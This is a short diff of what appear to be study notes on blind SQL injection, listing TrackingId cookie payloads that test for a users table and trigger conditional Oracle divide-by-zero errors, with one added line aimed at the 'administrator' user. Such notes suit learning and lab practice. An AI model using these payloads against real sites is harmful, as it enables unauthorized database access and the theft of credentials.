@@ -22,3 +22,5 @@ s7YSGusXA8EbL4Pt' and (select 'a' from users limit 1)='a'--
 
 Condition based (only true statement will be cause error)
 TrackingId=mp6CeV77mIcXSepY'||(select case when (1=2) then to_char(1/0) else '' end from dual )||'
+
+TrackingId=mp6CeV77mIcXSepY'||(select case when (1=2) then to_char(1/0) else '' end FROM users WHERE username='administrator' )||'
